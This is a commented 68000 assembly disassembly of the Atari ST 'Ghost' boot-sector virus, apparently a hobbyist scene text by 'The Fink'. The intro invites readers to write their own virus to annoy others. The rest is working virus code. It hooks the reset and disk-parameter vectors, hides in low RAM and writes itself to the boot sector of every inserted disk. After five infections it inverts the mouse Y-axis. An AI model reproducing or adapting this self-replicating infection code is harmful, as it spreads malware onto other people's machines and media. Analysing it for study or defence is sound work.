***************************************************************************
*GHOST VIRUS - DISASSEMBLE OF BOOTSECTOR BY 'THE FINK'                    *
***************************************************************************
*	Yo dweebs, it's The Fink here with some more interesting source   *
*code. Ever thought of writting your own virus ? this should help you piss*
*someone really off !!!!, how does it do it ???? well, read on....        *
***************************************************************************
* Firstly it checks address $140 (this is where the little critter hides) *
*to see if it's already in there, if it is then branch to an RTS statement*
*which exits the bootsector program 'cos theres no point doing anything if*
*one of it's cousins is already in memory. If it's not there then check   *
*the 'Reset Valid Vector' to see if theres already somthing there (which  *
*should not be) at the reset routine. It then saves the old reset routine *
*(presuming that it is the standard reset routine) and places a new       *
*routine there (on reset branch to address $194, which is where the virus *
*is!!!!. It then copys itself  to address $140 (just out of interest this *
*address is VERY low RAM, and is not used by the ST, you can put User     *
*interrupt vectors there, but since no programs do use these, it's an     *
*ideal place for our little virus to hide out, and escape being wiped).   *
* Next, it sets up a counter for how many copys it makes of itself onto   *
*discs (it starts at #$FFFFFFFB). It then needs to set up the parameter   *
*block for hard-discs (and discs in general), so it saves the old         *
*Parameter Block vector and places address $20E there instead, and then   *
*finaly it does an RTS to exit the bootsector program. It's now waiting   *
*there in memory for you to place a new disc in. Now I don't know much    *
*about the parameter block vector, but what I would fink is that everytime*
*you place a new disc in it goes to this vector to read the disc          *
*parameters, and since the parameter routine has been changed, instead it *
*now writes the virus to the bootsector. You can figure the rest out      *
*yourself. Got any other bootsectors you want to examin???? let me know   *
*and I'll have a look at them......bye*******THE FINK**********************
***************************************************************************
*MAIN PROGRAM, RUNS IN BOOTSECTOR..........                               *
***************************************************************************
$1E	MOVE.L	#$D6,D3		(214 DEC) LOOP COUNTER
	LEA	$140.W,A1	
	LEA	$1E(PC),A2
	MOVE.L	(A2),D2
	CMP.L	(A1),D2		IS THE GHOST VIRUS AREADY IN MEMORY ?
	BEQ	$6C		YES, SO THERES NO POINT IN CARRYING ON...
	MOVE.L	#$31415926,D0	VALID RESET VECTOR
	CLR.L	D1
	CMP.L	$426.W,D0	IS THERE SOMTHING ALREADY AT THIS VECTOR ?
	BNE	$48		YES, SOMTHINGS WRONG WITH THE RESET VECTOR
	MOVE.L	$42A.W,D1	RESET VECTOR
$48	LEA	$6E(PC),A0
	MOVE.L	D1,(A0)		SAVE RESET VECTOR
	MOVE.L	#$194,D2	RESET VECTOR ADDRESS
	MOVE.L	D2,$42A.W	NEW RESET VECTOR
	MOVE.L	D0,$426.W	NEW RESET VALID VECTOR, JUMPS TO ADDRESS $72 ON RESET
$5C	MOVE.W	(A2)+,(A1)+	COPY TO $140 430 BYTES (THE VIRUS)
	DBF	D3,$5C		LOOP 215 TIMES (COPY 215 WORDS, 430 BYTES)
	MOVE.L	#$FFFFFFFB,$2EA.W	VIRUS COUNTER (HOW MANY TIMES HAS IT COPYED ITSELF)
	BSR.S	$D0		SET UP HARD-DISC PARAMETERS

$6C	RTS			END OF BOOTSECTOR ROUTINE
*$6E	DC.L	0		HOLDS SAVED RESET VECTOR
***************************************************************************
*ON RESET, RUN THE FOLLOWING........                                      *
***************************************************************************
$72	MOVE.L	$42E.W,A1	HOLDS PHYSICAL TOP OF RAM ($80000=512K)
	SUBA.L	#$8000,A1
	SUBA.L	#$200,A1
	MOVE.L	A1,D1
	MOVE.L	#$12123456,(A1)+	COPY IT TO PHYS RAM MINUS $8200	
	MOVE.L	D1,(A1)+	COPY (PHYS RAM-$8200) THERE
				
	LEA	$D0(PC),A3 
	LEA	$EC(PC),A4
$94	MOVE.W	(A3)+,(A1)+	COPY ADDRESS $D0-$EA THERE
	CMPA.L	A4,A3
	BLT.S	$94		KEEP BRANCHING UNTIL ADDRESS IS GREATER
	LEA	$1E(PC),A3	
	MOVE.L	A3,(A1)+	COPY START OF VIRUS THERE
	MOVE.L	D1,A3		HOLDS PHYS TOP - $8200
	CLR.W	D0
	MOVE.W	#$FE,D2		LOOP COUNTER (254 DEC)
$A8	ADD.W	(A3)+,D0	ADD #$3456 TO D0
	DBF	D2,$A8		LOOP 255 TIMES	
	MOVE.W	#$5678,D2
	SUB.W	D0,D2
	MOVE.W	D2,(A3)
	MOVE.L	#$0,$426.W	CLEAR VALID RESET VECTOR
	MOVE.L	$6E(PC),A1	HOLDS SAVED RESET VECTOR
	CMPA.L	#$0,A1
	BNE	$CE
	JMP	(A6)
$CE	JMP	(A1)		ADDRESS JUMP TO $6E
***************************************************************************
*SET UP PARAMETER BLOCK (BIOS #7)                                         *
***************************************************************************	
$D0	MOVE.L	#$31415926,$426.W	PLACE VALID NUMBER IN RESET VECTOR JUMP
	MOVE.L	$472.W,D0	VECTOR TO PARAMETER BLOCK TO HARD-DISC
	LEA	$2E2.W,A0
	MOVE.L	D0,(A0)		SAVE IT HERE
	LEA	$20E.W,A0	NEW VECTOR FOR P. BLOCK, (BRANCH'S TO $EC)	
	MOVE.L	A0,$472.W	NEW PARAMETER BLOCK TO HARD-DISC
$EA	RTS			EXIT BOOTSECTOR PROGRAM
***************************************************************************
*ON USING PARAMETER BLOCK, RUN THE FOLLOWING........                      *
***************************************************************************
$EC	MOVE.W	$4(A7),D0
	CMP.W	#2,D0
	BGE	$1BE
	MOVEM.L	D1-D5/D7-D7/A0-A7,-(A7)	SAVE REGISTERS TO STACK
***************************************************************************
*READ BOOTSECTOR OF DISC                                                  *
***************************************************************************
	MOVE.W	D0,D7
	MOVE.L	#$1,-(A7)	READ 1 SECTOR , SIDE ZERO
	MOVE.L	#$10000,-(A7)	TRACK 1, SECTOR ZERO
	MOVE.W	D7,-(A7)	DEVICE, 0=DRIVE A,1=DRIVE B
	CLR.L	-(A7)
	LEA	$4C6.W,A5	BUFFER ADDRESS (1024-BYTE DISK BUFFER)
	MOVE.L	(A5),A5
	MOVE.L	A5,A6		SAVE IT HERE
	MOVE.L	A5,-(A7)	BUFFER
	MOVE.W	#$8,-(A7)
	TRAP	#14
	ADDA.L	#$14,A7	
	TST.W	D0		HAS AN ERROR OCCURED ?
	BMI	$1BA		APPARENTLY....
	MOVE.W	#$601C,(A5)	NEW DISK BUFFER ADDRESS
	LEA	$1E(PC),A4
	LEA	$1CE(PC),A3
$13C	MOVE.W	(A4)+,(A5)+	COPY VIRUS TO DISK BUFFER
	CMPA.L	A3,A4
	BLT.S	$13C
	
	MOVE.L	A6,A5		OLD DISK BUFFER ADDRESS
	MOVE.W	#$FE,D1		LOOP COUNTER (254)
	MOVE.W	#$1234,D0
$14C	SUB.W	(A5)+,D0
	DBF	D1,$14C		LOOP 255 TIMES
***************************************************************************	
*WRITE NEW BOOTSECTOR ONTO DISK                                           *
***************************************************************************
	MOVE.W	D0,(A5)
	MOVE.L	#$1,-(A7)	WRITE 1 SECTOR , SIDE ZERO
	MOVE.L	#$10000,-(A7)	WRITE TRACK 1, SECTOR ZERO
	MOVE.W	D7,-(A7)	DEVICE, 0=DRIVE A,1=DRIVE B
	CLR.L	-(A7)
	MOVE.L	A6,-(A7)
	MOVE.W	#$9,-(A7)	WRITE DISK SECTOR
	TRAP	#14
	ADDA.L	#$14,A7
	TST.W	D0		HAS AN ERROR OCCURED ?
	BMI	$1BA		APPARENTLY.....
	ADDI.L	#$1,$2EA.W
	CMPI.L	#$5,$2EA.W	HAS THE VIRUS COPIED ITSELF 5 TIMES ?
	BNE	$1BA		NO
	CLR.L	$2EA.W		YES, SO CLEAR COUNTER

	MOVE.W	#$22,-(A7)
	TRAP	#14		RETURN KEYBOARD VECTOR TABLE
	ADDQ.L	#$2,A7	
	ADD.L	#$10,D0		GET ORIGIN FOR Y-AXIS IS UP
	EXG	A0,D0		EXCHANGE REGISTERS A0 WITH D0 
				(FUCK THE MOUSE UP!!!!!!)
	MOVE.L	(A0),-(A7)
	PEA	$1C4(PC)	RESERVE 452 BYTES AT UPPER END OF MEMORY
	MOVE.L	#1,-(A7)
	TRAP	#14		SAVE MEMORY SPACE
	ADDA.L	#$C,A7
	
	EORI.B	#1,$2E6.W
	MOVEM.L	(A7)+,D1-D7/A0-A6	RESTORE REGISTERS FROM STACK
$1BE
	JMP	$FC0DE6		GET BIOS PARAMETER BLOCK.....
	